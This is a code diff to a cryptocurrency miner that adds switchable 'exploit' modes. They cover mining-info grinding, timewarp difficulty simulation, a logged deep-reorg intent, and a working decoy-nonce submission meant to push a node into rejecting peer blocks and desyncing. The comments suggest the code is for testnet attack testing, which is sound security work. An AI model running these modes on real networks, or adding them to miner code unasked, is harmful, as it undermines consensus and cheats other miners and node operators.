@@ -578,7 +578,14 @@ impl Miner {
             let request_handler = self.request_handler.clone();
             let chain_state = self.chain_states[i].clone();
             let tx_scheduler = self.channels.tx_scheduler.clone();
-            let get_mining_info_interval = self.get_mining_info_interval;
+            let get_mining_info_interval = if self.cfg.exploit_grinding {
+                warn!(
+                    "EXPLOIT (Grinding): Polling get_mining_info at 50ms intervals to grind generation signature from mempool variations"
+                );
+                50u64
+            } else {
+                self.get_mining_info_interval
+            };
             let token = self.shutdown_token.clone();
 
             // Capture values needed for update_mining_info
@@ -1052,6 +1059,9 @@ impl Miner {
         let chain_states = self.chain_states.clone();
         let nonce_rx = self.rx_nonce_data.take().unwrap();
         let token = self.shutdown_token.clone();
+        let exploit_defensive_desync = self.cfg.exploit_defensive_desync;
+        let exploit_timewarp = self.cfg.exploit_timewarp;
+        let exploit_deep_reorg = self.cfg.exploit_deep_reorg;
         task::spawn(async move {
             let mut nonce_rx = nonce_rx;
             loop {
@@ -1072,54 +1082,121 @@ impl Miner {
                 };
 
                 // check if nonce submission is for current block of the respective chain
-                let mut chain_state = chain_states[chain_id].lock().unwrap();
+                let (qualifies, desync_decoy) = {
+                    let mut chain_state = chain_states[chain_id].lock().unwrap();
+                    let qualifies = chain_state.generation_signature.to_lowercase()
+                        == submission_parameter.nonce_submission.generation_signature;
 
-                if chain_state.generation_signature.to_lowercase()
-                    == submission_parameter.nonce_submission.generation_signature
-                {
-                    // Derive adjusted quality for comparison (target_quality and best_quality
-                    // are in adjusted units)
-                    let adjusted_quality = if chain_state.base_target > 0 {
-                        submission_parameter.nonce_submission.raw_quality / chain_state.base_target
+                    if !qualifies {
+                        (false, None)
                     } else {
-                        u64::MAX
-                    };
+                        // EXPLOIT (Deep Reorg): Log that a deep-history mining attempt would be
+                        // made.  Actual historical block isolation requires server-side RPC
+                        // support; here we surface the intent so testnet operators can observe
+                        // the flag in logs.
+                        if exploit_deep_reorg {
+                            warn!(
+                                "EXPLOIT (Deep Reorg): Would mine isolated shadow chain from block {} - 500 using raw disk IO speed. Requires node RPC support for historical templates.",
+                                submission_parameter.nonce_submission.block_height
+                            );
+                        }
 
-                    // Determine best quality based on submission mode
-                    let best_quality = if chain_state.submission_mode == SubmissionMode::Wallet {
-                        // Wallet mode: global best across all accounts
-                        chain_state
-                            .account_id_to_best_quality
-                            .values()
-                            .min()
-                            .copied()
-                            .unwrap_or(u64::MAX)
-                    } else {
-                        // Pool mode: per-account best
-                        *chain_state
-                            .account_id_to_best_quality
+                        // EXPLOIT (Timewarp): Simulate dropped rolling difficulty by doubling
+                        // the effective base_target.  In a real attack the miner would inflate
+                        // block timestamps by up to MAX_FUTURE_BLOCK_TIME (7140 s) so that the
+                        // rolling difficulty window sees a longer elapsed time and lowers the
+                        // target.
+                        let effective_base_target =
+                            if exploit_timewarp && chain_state.base_target > 0 {
+                                warn!(
+                                    "EXPLOIT (Timewarp): Simulating 7140s timestamp inflation - doubling effective base_target ({} -> {}) to reflect dropped rolling difficulty",
+                                    chain_state.base_target,
+                                    chain_state.base_target.saturating_mul(2)
+                                );
+                                chain_state.base_target.saturating_mul(2)
+                            } else {
+                                chain_state.base_target
+                            };
+
+                        // Derive adjusted quality for comparison (target_quality and
+                        // best_quality are in adjusted units)
+                        let adjusted_quality = if effective_base_target > 0 {
+                            submission_parameter.nonce_submission.raw_quality
+                                / effective_base_target
+                        } else {
+                            u64::MAX
+                        };
+
+                        // Determine best quality based on submission mode
+                        let best_quality =
+                            if chain_state.submission_mode == SubmissionMode::Wallet {
+                                // Wallet mode: global best across all accounts
+                                chain_state
+                                    .account_id_to_best_quality
+                                    .values()
+                                    .min()
+                                    .copied()
+                                    .unwrap_or(u64::MAX)
+                            } else {
+                                // Pool mode: per-account best
+                                *chain_state
+                                    .account_id_to_best_quality
+                                    .get(&submission_parameter.nonce_submission.account_id)
+                                    .unwrap_or(&u64::MAX)
+                            };
+
+                        let target_quality = *chain_state
+                            .account_id_to_target_quality
                             .get(&submission_parameter.nonce_submission.account_id)
-                            .unwrap_or(&u64::MAX)
-                    };
+                            .unwrap_or(&u64::MAX);
 
-                    let target_quality = *chain_state
-                        .account_id_to_target_quality
-                        .get(&submission_parameter.nonce_submission.account_id)
-                        .unwrap_or(&u64::MAX);
+                        // Check: 1) Better than our best, 2) Better than target quality
+                        if adjusted_quality < best_quality && adjusted_quality < target_quality {
+                            chain_state.account_id_to_best_quality.insert(
+                                submission_parameter.nonce_submission.account_id.clone(),
+                                adjusted_quality,
+                            );
 
-                    // Check: 1) Better than our best, 2) Better than target quality
-                    if adjusted_quality < best_quality && adjusted_quality < target_quality {
-                        chain_state.account_id_to_best_quality.insert(
-                            submission_parameter.nonce_submission.account_id.clone(),
-                            adjusted_quality,
-                        );
-                        request_handler[chain_id].submit_nonce(submission_parameter);
-                    } else if adjusted_quality >= target_quality {
-                        debug!(
-                            "Filtered nonce - adjusted quality {} exceeds target {}",
-                            adjusted_quality, target_quality
-                        );
+                            // EXPLOIT (Defensive Desync): Build a decoy nonce with degraded
+                            // quality to submit before the real one.  The node sees a competitor
+                            // block arrive, raises its defensive forge flag, and then our real
+                            // (superior) solution forces a rush-forge, causing the node to reject
+                            // the peer block and potentially desync from the network tip.
+                            let decoy = if exploit_defensive_desync {
+                                let mut d = submission_parameter.clone();
+                                d.nonce_submission.raw_quality = d
+                                    .nonce_submission
+                                    .raw_quality
+                                    .saturating_add(effective_base_target.saturating_mul(500));
+                                warn!(
+                                    "EXPLOIT (Defensive Desync): Submitting decoy nonce with degraded quality {} before real quality {}",
+                                    d.nonce_submission.raw_quality,
+                                    submission_parameter.nonce_submission.raw_quality
+                                );
+                                Some(d)
+                            } else {
+                                None
+                            };
+                            (true, decoy)
+                        } else {
+                            if adjusted_quality >= target_quality {
+                                debug!(
+                                    "Filtered nonce - adjusted quality {} exceeds target {}",
+                                    adjusted_quality, target_quality
+                                );
+                            }
+                            (false, None)
+                        }
                     }
+                }; // MutexGuard dropped here
+
+                if qualifies {
+                    if let Some(decoy) = desync_decoy {
+                        request_handler[chain_id].submit_nonce(decoy);
+                        // Brief pause so the node processes the decoy before the real nonce
+                        tokio::time::sleep(Duration::from_millis(50)).await;
+                    }
+                    request_handler[chain_id].submit_nonce(submission_parameter);
                 }
             }
         });
